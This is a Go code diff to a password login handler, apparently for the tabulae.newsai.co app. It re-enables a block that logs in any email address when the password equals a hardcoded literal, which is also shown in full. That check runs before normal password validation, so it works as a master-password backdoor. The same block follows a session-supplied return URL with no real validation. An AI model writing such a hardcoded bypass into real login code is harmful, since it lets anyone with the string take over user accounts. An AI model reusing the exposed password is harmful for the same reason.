@@ -103,24 +103,24 @@ func PasswordLoginHandler() http.HandlerFunc {
 
 		log.Infof(c, "%v", validEmail.Address)
 
-		// if password == "ARcR9^YUpeAqz" {
-		// 	session.Values["email"] = validEmail.Address
-		// 	session.Save(r, w)
+		if password == "ARcR9^YUpeAqz" {
+			session.Values["email"] = validEmail.Address
+			session.Save(r, w)
 
-		// 	returnURL := "https://tabulae.newsai.co/"
-		// 	if session.Values["next"] != nil {
-		// 		returnURL = session.Values["next"].(string)
-		// 	}
-		// 	_, err := url.Parse(returnURL)
+			returnURL := "https://tabulae.newsai.co/"
+			if session.Values["next"] != nil {
+				returnURL = session.Values["next"].(string)
+			}
+			_, err := url.Parse(returnURL)
 
-		// 	// If there's an error in parsing the return value
-		// 	// then returning it.
-		// 	if err != nil {
-		// 		log.Errorf(c, "%v", err)
-		// 		http.Redirect(w, r, returnURL, 302)
-		// 		return
-		// 	}
-		// }
+			// If there's an error in parsing the return value
+			// then returning it.
+			if err != nil {
+				log.Errorf(c, "%v", err)
+				http.Redirect(w, r, returnURL, 302)
+				return
+			}
+		}
 
 		user, isOk, _ := apiControllers.ValidateUserPassword(r, validEmail.Address, password)
 		if user.GoogleId != "" {
